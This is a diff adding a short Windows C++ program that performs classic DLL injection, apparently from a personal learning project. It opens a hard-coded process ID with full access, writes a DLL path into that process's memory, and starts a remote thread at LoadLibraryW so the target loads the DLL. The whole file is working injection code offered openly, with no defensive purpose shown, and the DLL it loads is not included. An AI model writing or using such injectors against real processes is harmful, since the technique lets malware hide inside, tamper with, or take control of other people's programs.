@@ -1,0 +1,23 @@
+#include <iostream>
+#include <windows.h>
+
+DWORD PID, TID = NULL;
+LPVOID rBuffer = NULL;
+HANDLE hProcess, hThread = NULL;
+HMODULE hKernel32 = NULL;
+wchar_t dllPath[MAX_PATH] = L"C:\\Users\\ASUS\\source\\repos\\DLL-Injection\\x64\\Debug\\DLL-Injection.dll";
+size_t dllPathSize = sizeof(dllPath);
+
+int main(int argc, char* argv[]) {
+	PID = 17996;
+	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+	rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL);
+	hKernel32 = GetModuleHandleW(L"Kernel32");
+	LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
+	hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &TID);
+	WaitForSingleObject(hThread, INFINITE);
+	CloseHandle(hThread);
+	CloseHandle(hProcess);
+	return 0;
+}
